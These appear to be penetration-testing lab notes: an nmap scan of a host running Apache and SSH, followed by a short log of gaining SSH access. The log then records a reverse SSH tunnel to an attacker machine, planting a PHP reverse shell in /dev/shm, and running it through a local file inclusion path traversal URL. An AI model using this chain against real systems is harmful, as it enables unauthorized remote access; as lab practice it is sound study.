```
Nmap scan report for 192.168.173.246
Host is up (0.024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Code Validation
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
|_http-title: Code Validation
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/1%OT=80%CT=1%CU=31115%PV=Y%DS=4%DC=T%G=Y%TM=679E8
OS:2CD%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST
OS:11NW7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   21.35 ms 192.168.45.1
2   21.29 ms 192.168.45.254
3   24.77 ms 192.168.251.1
4   25.13 ms 192.168.173.246
```

Log:
- Got ssh access as anita:
	- ssh -i id_ecdsa -p 2222 anita@192.168.248.246
- Setup local port forwarding to access internal webpage on port 8000
	- ssh -N -R 127.0.0.1:2345:127.0.0.1:8000 kali@192.168.45.173
- wrote php-reverse-shell to /dev/shm
- executed shell via LFI by navigating to http://127.0.0.1:2345/backend/?view=../../../../../../../../../dev/shm/php-reverse-shell.php